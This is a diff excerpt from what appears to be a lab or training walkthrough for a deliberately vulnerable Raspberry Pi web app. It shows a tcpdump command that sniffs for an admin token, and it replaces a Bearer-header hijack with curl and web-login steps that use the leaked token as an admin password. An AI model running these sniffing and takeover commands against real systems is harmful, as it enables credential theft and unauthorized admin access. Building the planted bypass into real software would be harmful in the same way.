@@ -71,11 +71,11 @@ sudo tcpdump -i wlan0 -A tcp port 8000 | grep -a "admin_token"
 ```
 
 **Step 2.5: Admin Account Takeover**
-Use the captured admin_token to hijack admin access:
-```bash
-curl -H "Authorization: Bearer admin_session_leaked_12345" http://<rpi_ip>/admin/users
-```
-Passive sniffing alone won't work—the token only leaks when temp=999, which requires active MITM modification via ARP spoofing.
+Use the captured admin_token as the password to login as any admin user via the web interface or API:
+- Web: Go to `http://<rpi_ip>/api/auth/login`, enter an admin username (e.g., from user creation) and password `admin_session_leaked_12345`.
+- API: `curl -X POST http://<rpi_ip>/api/auth/login -H "Content-Type: application/json" -d '{"username":"admin","password":"admin_session_leaked_12345"}'`
+
+This bypasses password hashing for admin accounts, demonstrating credential theft via leaked data.
 
 ---
 
